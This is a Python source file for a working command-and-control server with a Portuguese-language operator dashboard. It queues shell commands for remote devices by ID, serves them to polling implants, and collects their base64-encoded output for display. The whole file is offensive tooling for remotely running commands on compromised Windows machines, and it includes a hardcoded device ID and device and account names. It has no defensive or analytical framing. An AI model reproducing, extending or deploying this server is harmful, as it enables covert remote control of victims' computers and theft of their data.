import json
import uuid
import time
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from collections import deque

# ── estado global ─────────────────────────────────────────────────────
pending_commands: deque = deque()
results: list = []

# ── html ──────────────────────────────────────────────────────────────
HTML = r"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>C2</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg:#ffffff;--bg2:#f7f7f5;--bg3:#f0efed;
    --border:#e0dedd;--text:#1a1a1a;--muted:#6b6b6b;--hint:#aaa;
    --green:#1a7f4e;--red:#c0392b;--blue:#1a5fa8;--yellow:#a05c00;
  }
  body{font-family:monospace;background:var(--bg);color:var(--text);
       display:grid;grid-template-rows:auto 1fr;height:100vh;overflow:hidden}
  header{padding:.75rem 1.5rem;border-bottom:1px solid var(--border);
         display:flex;align-items:center;gap:.75rem}
  header h1{font-size:.75rem;color:var(--muted);letter-spacing:.2em;
             text-transform:uppercase;flex:1}
  .refresh-btn{font-family:monospace;font-size:.75rem;background:var(--bg2);
               border:1px solid var(--border);color:var(--muted);
               padding:.3rem .75rem;cursor:pointer}
  .refresh-btn:hover{background:var(--bg3)}
  #auto-label{font-size:.75rem;color:var(--muted);display:flex;align-items:center;gap:.4rem}
  #countdown{color:var(--hint);min-width:18px}
  .layout{display:grid;grid-template-columns:260px 1fr;height:100%;overflow:hidden}

  .queue-panel{border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
  .panel-title{font-size:.7rem;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;
               padding:.75rem 1rem;border-bottom:1px solid var(--border)}
  .queue-list{flex:1;overflow-y:auto;padding:.5rem}
  .queue-item{background:var(--bg2);border:1px solid var(--border);padding:.5rem .75rem;
              margin-bottom:.4rem;font-size:.78rem}
  .queue-item .qcmd{color:var(--blue)}
  .queue-item .qdid{color:var(--hint);font-size:.68rem;margin-top:.2rem}
  .empty{color:var(--hint);font-size:.75rem;text-align:center;padding:2rem 0}

  .right-panel{display:grid;grid-template-rows:auto 1fr;overflow:hidden}
  .input-area{padding:.75rem 1rem;border-bottom:1px solid var(--border);display:flex;gap:.5rem}
  input{background:var(--bg2);border:1px solid var(--border);color:var(--text);
        padding:.45rem .7rem;font-family:monospace;font-size:.82rem;outline:none}
  input:focus{border-color:var(--muted)}
  #cmd{flex:1}
  #did{width:280px}
  button{background:var(--bg2);border:1px solid var(--border);color:var(--text);
         padding:.45rem 1rem;font-family:monospace;font-size:.82rem;cursor:pointer}
  button:hover{background:var(--bg3)}

  .results-area{overflow-y:auto;padding:1rem}
  .card{background:var(--bg2);border:1px solid var(--border);margin-bottom:.75rem;padding:.9rem 1rem}
  .card-meta{display:flex;justify-content:space-between;font-size:.68rem;color:var(--hint);margin-bottom:.4rem}
  .card-cmd{color:var(--blue);font-size:.82rem;margin-bottom:.35rem}
  .exit-ok{color:var(--green);font-size:.75rem}
  .exit-err{color:var(--red);font-size:.75rem}
  .ms{color:var(--hint);font-size:.68rem;margin-left:.6rem}
  .stdout{background:var(--bg3);border:1px solid var(--border);padding:.65rem;font-size:.76rem;
          white-space:pre-wrap;word-break:break-all;color:var(--text);
          margin-top:.5rem;max-height:260px;overflow-y:auto}
  .stderr-out{color:var(--red);font-size:.76rem;margin-top:.35rem;white-space:pre-wrap}
  .empty-results{color:var(--hint);font-size:.8rem;text-align:center;padding:4rem 0}
</style>
</head>
<body>
<header>
  <h1>C2 // command &amp; control</h1>
  <label id="auto-label">
    <input type="checkbox" id="auto-refresh" checked>
    auto <span id="countdown">5</span>s
  </label>
  <button class="refresh-btn" onclick="refresh()">↺ refresh</button>
</header>

<div class="layout">
  <div class="queue-panel">
    <div class="panel-title">fila <span id="queue-count" style="color:var(--hint)">(0)</span></div>
    <div class="queue-list" id="queue-list">
      <div class="empty" id="empty-queue">vazio</div>
    </div>
  </div>

  <div class="right-panel">
    <div class="input-area">
      <input id="cmd" type="text" placeholder="comando..." autocomplete="off">
      <input id="did" type="text" placeholder="device id" value="b7d412b0-6953-45a9-8bab-680796f8e927">
      <button onclick="sendCmd()">&#9654; enviar</button>
    </div>
    <div class="results-area" id="results">
      <div class="empty-results" id="empty-results">nenhum resultado ainda</div>
    </div>
  </div>
</div>

<script>
let countdown = 5;
let timer;

function startCountdown() {
  clearInterval(timer);
  countdown = 5;
  document.getElementById('countdown').textContent = countdown;
  timer = setInterval(() => {
    if (!document.getElementById('auto-refresh').checked) return;
    countdown--;
    document.getElementById('countdown').textContent = countdown;
    if (countdown <= 0) { refresh(); countdown = 5; }
  }, 1000);
}

async function refresh() {
  countdown = 5;
  document.getElementById('countdown').textContent = countdown;
  const [qRes, rRes] = await Promise.all([
    fetch('/api/queue').then(r => r.json()),
    fetch('/api/results').then(r => r.json()),
  ]);
  renderQueue(qRes);
  renderResults(rRes);
}

function renderQueue(items) {
  const list = document.getElementById('queue-list');
  document.getElementById('queue-count').textContent = '(' + items.length + ')';
  if (items.length === 0) {
    list.innerHTML = '<div class="empty" id="empty-queue">vazio</div>';
    return;
  }
  list.innerHTML = items.map(d => `
    <div class="queue-item">
      <div class="qcmd">&gt; ${escHtml(d.command)}</div>
      <div class="qdid">${d.device_id.slice(0,8)}...</div>
    </div>
  `).join('');
}

function renderResults(items) {
  const container = document.getElementById('results');
  if (items.length === 0) {
    container.innerHTML = '<div class="empty-results">nenhum resultado ainda</div>';
    return;
  }
  container.innerHTML = items.map(msg => {
    const p = msg.payload;
    const stdout = p.stdout ? decodeBase64Utf8(p.stdout) : '';
    const stderr = p.stderr ? decodeBase64Utf8(p.stderr) : '';
    const ok = p.exitcode === 0;
    return `
      <div class="card">
        <div class="card-meta">
          <span>${msg.devicename || msg.deviceid}</span>
          <span>${msg.timestamp}</span>
        </div>
        <div class="card-cmd">&gt; ${escHtml(p.command)}</div>
        <span class="${ok ? 'exit-ok' : 'exit-err'}">exit ${p.exitcode}</span>
        <span class="ms">${p.executionms}ms</span>
        ${stdout ? `<div class="stdout">${escHtml(stdout)}</div>` : ''}
        ${stderr ? `<div class="stderr-out">${escHtml(stderr)}</div>` : ''}
      </div>
    `;
  }).join('');
}

async function sendCmd() {
  const cmd = document.getElementById('cmd').value.trim();
  const did = document.getElementById('did').value.trim();
  if (!cmd || !did) return;
  await fetch('/command', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({command: cmd, device_id: did})
  });
  document.getElementById('cmd').value = '';
  refresh();
}

document.getElementById('cmd').addEventListener('keydown', e => {
  if (e.key === 'Enter') sendCmd();
});

function decodeBase64Utf8(b64) {
  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return new TextDecoder("utf-8").decode(bytes);
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

refresh();
startCountdown();
</script>
</body>
</html>"""


# ── helpers ───────────────────────────────────────────────────────────

def make_command(command: str, device_id: str) -> dict:
    return {
        "messageid":      str(uuid.uuid4()),
        "correlationid":  None,
        "timestamp":      time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "sequencenumber": len(results) + len(pending_commands),
        "type":           "command",
        "direction":      "server→client",
        "deviceid":       device_id,
        "devicename":     "OMEGADRIVER",
        "accountname":    "hairy",
        "encoding":       "utf8",
        "compressed":     False,
        "payload": {
            "command":          command,
            "shell":            "cmd",
            "timeoutms":        5000,
            "workingdirectory": None,
            "env":              {},
            "stdin":            "",
        },
    }


# ── cli log ───────────────────────────────────────────────────────────

RESET  = "\033[0m"
GRAY   = "\033[90m"
GREEN  = "\033[32m"
BLUE   = "\033[34m"
YELLOW = "\033[33m"
RED    = "\033[31m"
BOLD   = "\033[1m"

def ts():
    return time.strftime("%H:%M:%S")

def log(symbol, color, label, msg):
    print(f"{GRAY}{ts()}{RESET}  {color}{symbol}{RESET}  {BOLD}{label:<16}{RESET}  {msg}")

def log_queued(command, device_id):
    log("+", BLUE, "enfileirado", f"{BLUE}{command}{RESET}  {GRAY}→ {device_id[:8]}...{RESET}")

def log_delivering(command, device_id):
    log("↓", YELLOW, "entregando", f"{YELLOW}{command}{RESET}  {GRAY}→ {device_id[:8]}...{RESET}")

def log_result(command, exit_code, ms, stdout):
    color = GREEN if exit_code == 0 else RED
    mark  = "✓" if exit_code == 0 else "✗"
    log(mark, color, "resultado", f"{color}{command}{RESET}  exit={exit_code}  {GRAY}{ms}ms{RESET}")
    if stdout.strip():
        for line in stdout.strip().splitlines():
            print(f"           {GRAY}│{RESET}  {line}")
    print()

def log_connect(addr):
    log("→", GRAY, "conexão", f"{GRAY}{addr}{RESET}")


# ── handler ───────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # silencia o log padrão — usamos o nosso

    def send_json(self, code: int, data):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

    def send_empty(self, code: int):
        self.send_response(code)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if parsed.path == "/":
            body = HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", len(body))
            self.end_headers()
            self.wfile.write(body)

        elif parsed.path == "/api/queue":
            items = [
                {"messageid": c["messageid"], "command": c["payload"]["command"], "device_id": c["deviceid"]}
                for c in pending_commands
            ]
            self.send_json(200, items)

        elif parsed.path == "/api/results":
            self.send_json(200, list(reversed(results)))

        elif parsed.path == "/command":
            device_id = params.get("deviceid", [None])[0]
            if not device_id:
                self.send_empty(400)
                return

            if not pending_commands:
                self.send_empty(204)
                return

            cmd = pending_commands.popleft()
            log_delivering(cmd["payload"]["command"], device_id)
            self.send_json(200, cmd)

        else:
            self.send_empty(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)

        if self.path == "/command":
            try:
                data      = json.loads(body)
                command   = data["command"]
                device_id = data["device_id"]
            except (json.JSONDecodeError, KeyError):
                self.send_empty(400)
                return

            cmd = make_command(command, device_id)
            pending_commands.append(cmd)
            log_queued(command, device_id)
            self.send_empty(200)

        elif self.path == "/result":
            try:
                msg = json.loads(body)
            except json.JSONDecodeError:
                self.send_empty(400)
                return

            if msg.get("type") != "command_result":
                self.send_empty(400)
                return

            results.append(msg)
            p      = msg["payload"]
            stdout = base64.b64decode(p.get("stdout", "")).decode("utf-8")
            log_result(p["command"], p["exitcode"], p["executionms"], stdout)
            self.send_empty(200)

        else:
            self.send_empty(404)


# ── main ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 8000
    server = HTTPServer((HOST, PORT), Handler)
    print(f"{BOLD}[C2]{RESET}  http://{HOST}:{PORT}\n")
    server.serve_forever()
